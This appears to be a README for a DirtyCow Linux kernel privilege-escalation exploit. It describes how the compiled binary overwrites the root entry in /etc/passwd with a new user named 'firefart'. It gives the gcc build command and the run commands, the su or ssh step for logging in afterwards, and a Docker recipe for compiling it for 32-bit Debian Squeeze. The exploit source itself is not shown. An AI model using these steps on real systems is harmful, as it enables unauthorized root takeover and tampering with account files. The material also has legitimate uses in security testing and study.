# DirtyCow Origin

This exploit uses the pokemon exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line.
The user will be prompted for the new password when the binary is run.
The original /etc/passwd file is then backed up to /tmp/passwd.bak and overwrites the root account with the generated line.
After running the exploit you should be able to login with the newly created user.

To use this exploit modify the user values according to your needs.

The default user being created is `firefart`.

Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
  https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c

Compile with:

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

Then run the newly create binary by either doing:
```bash
./dirty
```

or

```bash
 ./dirty my-new-password
 ```
Afterwards, you can either `su firefart` or `ssh firefart@...`

**DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!**

```bash
mv /tmp/passwd.bak /etc/passwd
```

Exploit adopted by Christian "FireFart" Mehlmauer

https://firefart.at

# DirtyCow with Cowherd

## Compile for Debian Squeeze 32
* Use a docker target os to compile the exploit 
```
docker run --platform linux/386 -it -v $(pwd):/tmp debian/eol:squeeze
root@07ccd56551fe:/# apt-get update
...
root@07ccd56551fe:/# apt-get install gcc
....
root@07ccd56551fe:/# cd /tmp
root@07ccd56551fe:/tmp# head -n 20 dirty.c
...
root@07ccd56551fe:/tmp# head -n 20 cowherd.c
...
```
* Follow the compilation instructions


